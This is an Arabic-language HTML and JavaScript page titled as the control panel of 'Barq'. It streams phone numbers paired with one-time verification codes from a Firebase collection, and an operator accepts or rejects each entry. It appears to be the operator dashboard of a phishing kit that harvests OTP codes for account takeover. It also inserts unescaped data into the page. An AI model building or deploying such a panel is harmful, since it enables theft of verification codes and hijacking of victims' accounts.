<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>لوحة التحكم - برق</title>
    <style>
        body { font-family: sans-serif; background: #f4f4f4; padding: 20px; }
        .card { background: #fff; padding: 15px; margin-bottom: 10px; border-radius: 10px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .btn { padding: 8px 15px; border-radius: 5px; border: none; cursor: pointer; color: white; }
        .accept { background: green; }
        .reject { background: red; }
    </style>
</head>
<body>
    <h2>البيانات الواردة</h2>
    <div id="dataList"></div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
        import { getFirestore, collection, onSnapshot, doc, deleteDoc } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";

        // ضع هنا إعدادات Firebase الخاصة بك
        const firebaseConfig = { /* انسخها من Firebase Console */ };
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        const list = document.getElementById('dataList');

        onSnapshot(collection(db, "users"), (snapshot) => {
            list.innerHTML = "";
            snapshot.forEach((doc) => {
                const data = doc.data();
                const div = document.createElement('div');
                div.className = 'card';
                div.innerHTML = `
                    <div><strong>الجوال:</strong> ${data.phone} | <strong>الرمز:</strong> ${data.otp}</div>
                    <div>
                        <button class="btn accept" onclick="alert('تم القبول')">قبول</button>
                        <button class="btn reject" onclick="deleteRecord('${doc.id}')">رفض</button>
                    </div>
                `;
                list.appendChild(div);
            });
        });

        window.deleteRecord = async (id) => {
            await deleteDoc(doc(db, "users", id));
        };
    </script>
</body>
</html>
